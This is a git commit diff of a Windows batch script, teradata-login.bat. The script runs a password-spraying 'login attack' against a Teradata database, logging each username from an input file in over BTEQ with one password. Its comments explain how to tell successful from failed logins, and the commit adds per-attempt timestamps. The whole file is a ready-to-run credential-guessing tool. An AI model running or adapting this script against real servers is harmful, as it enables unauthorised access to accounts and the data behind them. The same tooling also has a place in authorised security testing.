d9489b0475bd3d02058b1c7cebe5e1a9dd82a2d7
Ted R <actuated@users.noreply.github.com>
2016-10-04 09:04:17 -0500

    Update: Timestamps in For Loop (Delayed Expansion)

--- teradata-login.bat
+++ teradata-login.bat
@@ -1,43 +1,47 @@
-@ECHO OFF
-REM teradata-login.bat by Ted R (github: actuated)
-REM Created 10/3/2016, Last Modified 10/3/2016
-REM
-REM Simple login script for Teradata, using BTEQ.
-REM Note that successful logins will hang, waiting for a BTEQ command. Time
-REM stamps have been provided to make this easy to notice. You can then enter
-REM the .QUIT command to end that iteration of the FOR loop and continue the
-REM login attack.
-REM
-REM Failed login: *** Failure 8017 The UserId, Password or Account is invalid.
-REM Successful login: *** Logon successfully completed.
+@echo off
+rem teradata-login.bat by Ted R (github: actuated)
+rem Created 10/3/2016, Last Modified 10/4/2016
+rem
+rem Simple login script for Teradata, using BTEQ.
+rem Note that successful logins will hang, waiting for a BTEQ command. Time
+rem stamps have been provided to make this easy to notice. You can then enter
+rem the .QUIT command to end that iteration of the FOR loop and continue the
+rem login attack.
+rem
+rem Failed login: *** Failure 8017 The UserId, Password or Account is invalid.
+rem Successful login: *** Logon successfully completed.
+rem
+rem 10/4/2016 - Added delayed expansion for timestamp within for loop.
 
-SET strINFILE=***SETME***
-SET strOUTFILE=***SETME***
-SET strSERVER=***SETME***
-SET strPASS=***SETME***
+set strINFILE=***SETME***
+set strOUTFILE=***SETME***
+set strSERVER=***SETME***
+set strPASS=***SETME***
 
-ECHO.
-ECHO ================[ teradata-login.bat - Ted R (github: actuated) ]================
-IF EXIST %strOUTFILE% (
-	ECHO.
-	ECHO FYI: %strOUTFILE% already exists. Continue to append, or Ctrl+C to exit.
+setlocal EnableDelayedExpansion
+
+echo.
+echo ================[ teradata-login.bat - Ted R (github: actuated) ]================
+if exist %strOUTFILE% (
+	echo.
+	echo FYI: %strOUTFILE% already exists. Continue to append, or Ctrl+C to exit.
 	PAUSE
 )
-ECHO.
-ECHO. >> %strOUTFILE%
-ECHO Started: %date% %time%
-ECHO Started: %date% %time% >> %strOUTFILE%
-ECHO.
+echo.
+echo. >> %strOUTFILE%
+echo Started: %date% %time%
+echo Started: %date% %time% >> %strOUTFILE%
+echo.
 
 for /f %%i in (%strINFILE%) do (
-	echo %time%: %%i:%strPASS%
+	echo !time!: %%i:%strPASS%
 	bteq .LOGON %strSERVER%/%%i,%strPASS%^;ABORT^;.QUIT >> %strOUTFILE% 2>NUL
 )
 
-ECHO.
-ECHO. >> %strOUTFILE%
-ECHO Done: %date% %time%
-ECHO Done: %date% %time% >> %strOUTFILE%
-ECHO.
-ECHO =====================================[ fin ]=====================================
-ECHO.
+echo.
+echo. >> %strOUTFILE%
+echo Done: %date% %time%
+echo Done: %date% %time% >> %strOUTFILE%
+echo.
+echo =====================================[ fin ]=====================================
+echo.
